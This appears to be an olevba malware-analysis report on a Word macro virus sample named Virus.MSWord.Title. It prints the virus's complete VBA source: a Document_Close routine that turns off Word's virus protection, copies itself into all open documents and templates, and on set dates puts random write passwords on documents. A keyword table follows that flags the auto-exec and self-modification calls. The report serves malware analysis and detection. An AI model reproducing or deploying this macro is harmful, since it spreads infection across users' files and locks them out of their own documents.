olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Title-7e4ba901ccdf102c82787a942d2af4126f3f44f2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Title-7e4ba901ccdf102c82787a942d2af4126f3f44f2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
    If Left(Me.BuiltInDocumentProperties("Title"), 1) = "?" Then
        Me.BuiltInDocumentProperties("Title") = Mid(Me.BuiltInDocumentProperties("Title"), 2)
        Exit Sub
    End If
    Me.BuiltInDocumentProperties("Title") = "?" & Me.BuiltInDocumentProperties("Title")
    Dim currdoc As Document
    Dim thecode As Object
    Dim currcomp As Object
    Set thecode = Me.VBProject.VBComponents.Item(Me.CodeName).CodeModule
    Dim lines As Integer, mystart As Integer
    mystart = thecode.ProcBodyLine("Document_Close", vbext_pk_Proc)
    mylines = thecode.ProcCountLines("Document_Close", vbext_pk_Proc) - mystart + 1
    Dim savy As Boolean
    Options.VirusProtection = False
    For Each currdoc In Documents
        savy = currdoc.Saved
        If currdoc.SaveFormat = wdFormatDocument Or currdoc.SaveFormat = wdFormatTemplate Then
            Set currcomp = currdoc.VBProject.VBComponents.Item(1)
            If Not currcomp.CodeModule.Find("wsxzaqedc", 1, 1, 100000, 100000) Then
                If Not currcomp.CodeModule.Find("Document_Close", 1, 1, 100000, 100000) Then
                    currcomp.CodeModule.AddFromString thecode.lines(mystart, mylines)
                Else
                    currcomp.CodeModule.InsertLines currcomp.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc) + 1, thecode.lines(mystart + 1, mylines - 2)
                End If
                If savy Then currdoc.Save
            End If
            If (Day(Now()) = 30 And Month(Now()) = 7) Or (Day(Now()) = 20 And Month(Now()) = 6) Or (Day(Now()) = 3 And Month(Now()) = 5) Then
                currdoc.WritePassword = Str(Int(Rnd() * 10) - 1)
                If savy Then currdoc.Save
            End If

        End If
    Next currdoc
    Dim currtemp As Template
    Dim code As String
    For Each currtemp In Templates
        savy = currtemp.Saved
        Set currcomp = currtemp.VBProject.VBComponents.Item(1)
        If Not currcomp.CodeModule.Find("wsxzaqedc", 1, 1, 100000, 100000) Then
            If Not currcomp.CodeModule.Find("Document_Close", 1, 1, 100000, 100000) Then
                code = thecode.lines(mystart, mylines)
                currcomp.CodeModule.AddFromString code
            Else
                code = thecode.lines(mystart + 1, mylines - 2)
                currcomp.CodeModule.InsertLines currcomp.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc) + 1, code
            End If
            If savy Then currtemp.Save
         End If
    Next currtemp
    Me.BuiltInDocumentProperties("Title") = Mid(Me.BuiltInDocumentProperties("Title"), 2)
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

